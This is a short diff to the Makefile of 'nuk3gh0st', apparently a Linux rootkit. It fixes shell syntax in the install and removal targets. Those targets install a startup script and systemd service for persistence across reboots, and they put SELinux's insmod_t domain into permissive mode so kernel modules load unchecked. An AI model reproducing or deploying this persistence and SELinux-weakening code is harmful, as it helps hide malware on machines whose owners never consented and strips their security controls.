@@ -18,6 +18,7 @@ startup:
 	chmod +x /usr/lib/nuk3gh0st.startup
 	cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
 	if [ -f /usr/sbin/semanage ]
+	then
     		semanage permissive -a insmod_t
 	fi
 	systemctl enable nuk3gh0st.service
@@ -26,6 +27,7 @@ clean-startup:
 	systemctl disable nuk3gh0st.service
 	service nuk3gh0st stop
 	if [ -f /usr/sbin/semanage ]
+	then
     		semanage permissive -d insmod_t
 	fi
 	rm /usr/lib/nuk3gh0st.startup
